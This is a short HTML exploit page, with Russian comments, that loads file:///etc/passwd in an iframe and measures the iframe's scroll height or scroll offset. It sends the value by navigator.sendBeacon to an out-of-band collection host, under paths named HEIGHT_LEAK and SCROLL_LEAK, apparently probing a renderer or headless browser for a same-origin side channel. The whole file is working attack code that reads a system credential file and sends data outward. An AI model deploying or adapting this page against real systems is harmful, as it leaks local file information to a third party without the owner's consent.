<!DOCTYPE html>
<html>
<body>
    <div id="container" style="width: 1px; word-wrap: break-word;">
        <iframe id="victim" src="file:///etc/passwd" style="width: 100%; height: 10px;"></iframe>
    </div>

    <script>
        const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
        
        window.onload = () => {
            const ifr = document.getElementById('victim');
            
            setTimeout(() => {
                try {
                    // Мы не можем прочитать текст, но можем попробовать прочитать ВЫСОТУ
                    // Если высота > 10px, значит там есть контент!
                    const height = ifr.contentWindow.document.body.scrollHeight;
                    navigator.sendBeacon(hook + "/HEIGHT_LEAK", "Lines_Height: " + height);
                } catch(e) {
                    // Если SOP блокирует высоту, пробуем метод "Scroll"
                    const scrollPos = ifr.contentWindow.pageYOffset;
                    navigator.sendBeacon(hook + "/SCROLL_LEAK", "Pos: " + scrollPos);
                }
            }, 1000);
        };
    </script>
</body>
</html>
